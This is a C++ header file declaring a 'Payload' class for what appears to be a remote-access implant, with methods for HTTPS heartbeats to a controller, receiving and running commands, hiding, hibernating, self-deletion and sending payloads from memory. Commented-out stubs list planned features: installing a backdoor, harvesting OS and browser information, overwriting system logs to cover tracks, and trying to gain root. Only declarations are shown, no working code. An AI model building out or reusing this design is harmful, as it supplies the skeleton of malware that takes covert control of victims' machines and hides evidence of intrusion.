#pragma once

#include "https.h"
#include <vector>
#include <string>

#define MAX_PATH 1024

class Payload {
    public:
	int heartbeat(Https &https, int i, int j);
	int hide();
	void hibernate();
	int suicide();

	int spawnChild(std::vector<std::string> &commands,
		       std::vector<std::string> &results, int *suicide);

	std::vector<std::string> recvCMD(Https &https, int i, int j);
	int runCMD(std::vector<std::string> &commands,
		   std::vector<std::string> &results);

	int sendMemPayload(Https &https, int fd,
			   const std::string &jsonPayload);
};

//bool implementBD();                // downloads and setup backdoor program
//std::string grabOSInfo();          //
//std::string grabBrowserInfo();
//stdd::string produceLogs();         // overwrite system logs
//bool isRoot();                     // checks if root
//bool tryRoot();                    // attempts to gain root
